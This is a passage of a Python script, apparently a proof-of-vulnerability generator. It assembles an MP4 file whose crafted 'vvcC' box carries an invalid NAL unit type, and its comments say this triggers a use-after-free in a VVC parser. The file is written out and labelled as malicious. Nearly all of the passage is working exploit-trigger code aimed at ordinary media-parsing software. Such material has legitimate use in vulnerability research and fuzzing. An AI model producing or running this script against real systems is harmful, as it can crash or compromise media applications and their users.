', hdlr_data)\n\n# minf box\nminf_data = b\'\'\n\n# vmhd box\nvmhd_data = struct.pack(\'>IHHHH\', 1, 0, 0, 0, 0)\nminf_data += write_box(b\'vmhd\', vmhd_data)\n\n# dinf box\ndinf_data = b\'\'\ndref_data = struct.pack(\'>II\', 0, 1)\ndref_data += struct.pack(\'>I4sI\', 12, b\'url \', 1)\ndinf_data += write_box(b\'dref\', dref_data)\nminf_data += write_box(b\'dinf\', dinf_data)\n\n# stbl box\nstbl_data = b\'\'\n\n# stsd box - contains VVC sample entry with MALICIOUS vvcC\nstsd_data = struct.pack(\'>II\', 0, 1)\n\n# VVC sample entry (vvi1)\nvvc_entry = b\'\'\nvvc_entry += struct.pack(\'>H\', 0)  # reserved\nvvc_entry += struct.pack(\'>H\', 0)  # reserved\nvvc_entry += struct.pack(\'>HHHH\', 0, 0, 0, 0)  # reserved\nvvc_entry += struct.pack(\'>HH\', 1920, 1080)  # width, height\nvvc_entry += struct.pack(\'>II\', 0x00480000, 0x00480000)  # horiz/vert resolution\nvvc_entry += struct.pack(\'>I\', 0)  # reserved\nvvc_entry += struct.pack(\'>H\', 1)  # frame count\nvvc_entry += b\'\\x00\' * 32  # compressor name (32 bytes)\nvvc_entry += struct.pack(\'>H\', 0x0018)  # depth\nvvc_entry += struct.pack(\'>h\', -1)  # pre_defined\n\n# MALICIOUS vvcC box - triggers UAF\n# The vulnerability: when NALU type is invalid (not in valid range),\n# ar is freed at line 1399, but then line 1403 accesses ar->type causing UAF\nvvcc_data = b\'\'\n\n# VVC config header - set ptl_present_flag=0 to skip PTL parsing\n# Byte 0: [5 bits reserved][2 bits lengthSizeMinusOne][1 bit ptl_present]\nvvcc_data += struct.pack(\'>B\', 0x00)  # ptl_present=0, lengthSizeMinusOne=0\n\n# When ptl_present=0, we skip to the array count directly\n# numOfArrays = 1\nvvcc_data += struct.pack(\'>B\', 1)\n\n# NALU array with INVALID type to trigger UAF\n# Byte format: [1 bit array_completeness][2 bits reserved][5 bits NAL_unit_type]\n# Valid VVC types for vvcC: 12 (DEC_PARAM), 13 (OPI), 14 (VID_PARAM), 15 (SEQ_PARAM), 16 (PIC_PARAM), 23 (SEI_PREFIX), 24 (SEI_SUFFIX)\n# Use type 1 (INVALID) to trigger the default case and free ar\nvvcc_data += struct.pack(\'>B\', 0x01)  # array_completeness=0, reserved=0, type=1 (INVALID!)\n\n# After the switch statement frees ar (line 1399), line 1403 accesses ar->type\n# This happens because the check at line 1403 doesn\'t verify if ar is still valid\n# For invalid types, ar is freed but the code still tries to read ar->type\n\n# numNalus (2 bytes) - the code will try to read this and access freed ar->type\nvvcc_data += struct.pack(\'>H\', 1)  # numNalus = 1\n\n# NALU size and data\nvvcc_data += struct.pack(\'>H\', 10)  # NALU size\nvvcc_data += b\'\\x00\' * 10  # dummy NALU data\n\nvvc_entry += write_box(b\'vvcC\', vvcc_data)\n\n# Write the vvi1 sample entry\nstsd_data += write_box(b\'vvi1\', vvc_entry)\nstbl_data += write_box(b\'stsd\', stsd_data)\n\n# Required sample table boxes (minimal)\nstts_data = struct.pack(\'>II\', 0, 0)\nstbl_data += write_box(b\'stts\', stts_data)\n\nstsc_data = struct.pack(\'>II\', 0, 0)\nstbl_data += write_box(b\'stsc\', stsc_data)\n\nstsz_data = struct.pack(\'>III\', 0, 0, 0)\nstbl_data += write_box(b\'stsz\', stsz_data)\n\nstco_data = struct.pack(\'>II\', 0, 0)\nstbl_data += write_box(b\'stco\', stco_data)\n\nminf_data += write_box(b\'stbl\', stbl_data)\nmdia_data += write_box(b\'minf\', minf_data)\ntrak_data += write_box(b\'mdia\', mdia_data)\nmoov_data += write_box(b\'trak\', trak_data)\nmp4_data += write_box(b\'moov\', moov_data)\n\n# Write the malicious MP4 file\nwith open(output_path, \'wb\') as f:\n    f.write(mp4_data)\n\nprint(f"Generated PoV at {output_path}")\nprint(f"File size: {len(mp4_data)} bytes")\n'}
